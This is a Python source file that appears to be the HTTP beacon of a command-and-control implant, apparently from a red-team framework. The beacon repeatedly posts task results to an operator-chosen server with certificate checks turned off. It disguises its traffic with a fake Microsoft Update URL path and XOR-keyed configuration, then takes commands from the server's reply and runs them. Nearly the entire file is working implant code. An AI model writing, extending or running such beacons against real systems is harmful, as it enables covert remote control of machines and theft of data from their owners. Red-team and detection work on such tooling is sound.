import sys
import time
import json
import random
from pathlib import Path

import requests

import urllib3
urllib3.disable_warnings()

from Beacon import Beacon


DEFAULT_HTTP_SCHEME = "http"
DEFAULT_HTTPS_SCHEME = "https"
DEFAULT_ENDPOINT_FALLBACK = "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"
DEFAULT_CONTENT_TYPE = "text/plain;charset=UTF-8"
DEFAULT_ROOT_ENDPOINT = "/"
HEADER_CONTENT_TYPE = "Content-Type"
CONFIG_KEY_XOR = "xorKey"
CONFIG_KEY_LISTENER_HTTPS = "ListenerHttpsConfig"
CONFIG_KEY_LISTENER_HTTP = "ListenerHttpConfig"
CONFIG_KEY_URI = "uri"
CONFIG_KEY_CLIENT = "client"
CONFIG_KEY_HEADERS = "headers"


class BeaconHttp(Beacon):

    def __init__(self, url, port, isHttps, config_path=None):
        super().__init__()
        self.url = str(url)
        self.port = str(port)
        self.isHttps = isHttps.lower() == DEFAULT_HTTPS_SCHEME
        self.scheme = DEFAULT_HTTPS_SCHEME if self.isHttps else DEFAULT_HTTP_SCHEME
        self._headers = {}
        self._uris = []

        if config_path is None:
            config_path = Path(__file__).with_name("BeaconConfig.json")
        else:
            config_path = Path(config_path)

        self._load_config(config_path)


    def checkIn(self):
        payload = self.serialize_task_results()

        if self._uris:
            endpoint = random.choice(self._uris)
        else:
            endpoint = DEFAULT_ROOT_ENDPOINT

        if not endpoint.startswith(DEFAULT_ROOT_ENDPOINT):
            endpoint = DEFAULT_ROOT_ENDPOINT + endpoint

        url = f"{self.scheme}://{self.url}:{self.port}{endpoint}"

        verify = False if self.isHttps else True

        try:
            response = requests.post(
                url,
                data=payload.encode("utf-8"),
                headers=self._headers,
                verify=verify,
                timeout=15,
            )
        except requests.RequestException:
            return

        if response.status_code != 200:
            return

        body = response.content.decode("utf-8", errors="ignore").strip()
        if not body:
            return

        self.cmdToTasks(body)


    def _load_config(self, config_path: Path) -> None:
        try:
            config_text = config_path.read_text(encoding="utf-8")
            config_data = json.loads(config_text)
        except Exception:
            config_data = {}

        xor_key = config_data.get(CONFIG_KEY_XOR, "")
        self.set_xor_key(xor_key)

        listener_key = CONFIG_KEY_LISTENER_HTTPS if self.isHttps else CONFIG_KEY_LISTENER_HTTP
        listener_cfg = config_data.get(listener_key, {})

        uris = listener_cfg.get(CONFIG_KEY_URI, [])
        if isinstance(uris, list) and uris:
            self._uris = [str(uri) for uri in uris if isinstance(uri, str)]
        else:
            self._uris = [DEFAULT_ENDPOINT_FALLBACK]

        headers = (
            listener_cfg.get(CONFIG_KEY_CLIENT, {})
            .get(CONFIG_KEY_HEADERS, {})
        )
        if isinstance(headers, dict) and headers:
            self._headers = {str(k): str(v) for k, v in headers.items()}
        else:
            self._headers = {HEADER_CONTENT_TYPE: DEFAULT_CONTENT_TYPE}

        if HEADER_CONTENT_TYPE not in self._headers:
            self._headers[HEADER_CONTENT_TYPE] = DEFAULT_CONTENT_TYPE



    def runTasks(self):
        self.execInstruction()



def main() -> int:

    if len(sys.argv) < 3:
        print('Error: missing argument')
        sys.exit(1)

    url = sys.argv[1]
    port = sys.argv[2]
    isHttps = sys.argv[3]
    config_path = sys.argv[4] if len(sys.argv) > 4 else None

    beaconHttp = BeaconHttp(url, port, isHttps, config_path)
    
    while 1:
        beaconHttp.checkIn()

        beaconHttp.runTasks()

        time.sleep(beaconHttp.sleepTimeMs/1000)

    return 0

if __name__ == '__main__':
    main()

